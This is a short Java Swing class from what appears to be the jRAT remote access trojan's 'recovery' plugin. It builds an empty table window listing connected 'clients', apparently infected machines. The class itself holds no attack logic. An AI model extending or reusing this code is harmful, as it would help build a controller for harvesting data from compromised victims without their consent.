package jrat.plugin.recovery.client;

import java.awt.BorderLayout;
import java.util.List;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableModel;

import jrat.api.Client;

@SuppressWarnings("serial")
public class FrameRecovery extends JFrame {

	private List<Client> clients;
	
	private JPanel contentPane;
	private JTable table;
	private DefaultTableModel model;

	public FrameRecovery(List<Client> clients) {
		this.clients = clients;
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 535, 370);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(0, 0, 0, 0));
		setContentPane(contentPane);
		contentPane.setLayout(new BorderLayout(0, 0));
		
		JScrollPane scrollPane = new JScrollPane();
		contentPane.add(scrollPane, BorderLayout.CENTER);
		
		model = new DefaultTableModel();
		model.addColumn("Client");
		model.addColumn("");
		model.addColumn("");
		model.addColumn("");
		
		table = new JTable();
		table.setModel(model);
		scrollPane.setViewportView(table);
	}
}
